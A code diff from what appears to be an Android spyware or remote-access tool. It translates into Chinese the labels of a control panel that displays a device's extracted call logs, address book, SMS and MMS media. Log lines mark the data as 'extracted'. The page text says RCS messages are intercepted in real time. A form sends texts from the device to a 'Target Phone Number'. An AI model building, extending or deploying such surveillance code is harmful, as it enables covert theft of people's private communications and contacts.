@@ -85,7 +85,7 @@ public class CommsModule extends BaseModule {
         FirebaseConfig.logActivity("COMMS_EXTRACT: Call history retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">RECENT_CALL_LOGS</h2>");
+        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">通话记录</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
 
         html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
@@ -272,7 +272,7 @@ public class CommsModule extends BaseModule {
         FirebaseConfig.logActivity("CONTACT_EXTRACT: Address book retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">CONTACT_DATABASE</h2>");
+        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">通讯录</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
 
         html.append("<div style=\"margin-top: 20px;\">");
@@ -418,7 +418,7 @@ public class CommsModule extends BaseModule {
         FirebaseConfig.logActivity("COMMS_EXTRACT: SMS history retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128233; SMS_TERMINAL</h2>");
+        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128233; 短信</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
         html.append("<p style=\"color: #888; font-size: 0.75rem; margin-bottom: 20px;\"><b>Note:</b> RCS and Advanced Messaging (Blue Bubbles) are intercepted in real-time in the <a href=\"/intel\" style=\"color: var(--neon-cyan);\">Intel Tab</a>.</p>");
         html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
@@ -428,7 +428,7 @@ public class CommsModule extends BaseModule {
         html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
         html.append("<textarea name=\"message\" placeholder=\"Message Content\" rows=\"3\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
         html.append("<div style=\"text-align: center; width: 100%; margin-top: 15px; display: flex; justify-content: center;\">");
-        html.append("<button type=\"submit\" class=\"btn\" style=\"width: 250px !important; margin: 0 auto !important;\">ENCRYPT & SEND</button>");
+        html.append("<button type=\"submit\" class=\"btn\" style=\"width: 250px !important; margin: 0 auto !important;\">加密并发送</button>");
         html.append("</div>");
         html.append("</div></form>");
 
@@ -513,7 +513,7 @@ public class CommsModule extends BaseModule {
         FirebaseConfig.logActivity("COMMS_EXTRACT: MMS media database retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128247; MMS_TERMINAL</h2>");
+        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128247; 彩信</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
         
         html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
@@ -585,7 +585,7 @@ public class CommsModule extends BaseModule {
                                 .append("<source src=\"/mms/media/").append(part.substring(6)).append("\">")
                                 .append("Your browser does not support the video tag.")
                                 .append("</video></div>")
-                                .append("<div style=\"margin-top:5px;\"><a href=\"/mms/media/").append(part.substring(6)).append("\" target=\"_blank\" class=\"btn btn-small\" style=\"font-size:0.6rem; border-color:var(--neon-cyan); color:var(--neon-cyan);\">DOWNLOAD_VIDEO</a></div>");
+                                .append("<div style=\"margin-top:5px;\"><a href=\"/mms/media/").append(part.substring(6)).append("\" target=\"_blank\" class=\"btn btn-small\" style=\"font-size:0.6rem; border-color:var(--neon-cyan); color:var(--neon-cyan);\">下载视频</a></div>");
                         }
                     }
                     html.append("</td><td style=\"font-size:0.75rem;\">").append(formatMessageDate(date)).append("</td></tr>");
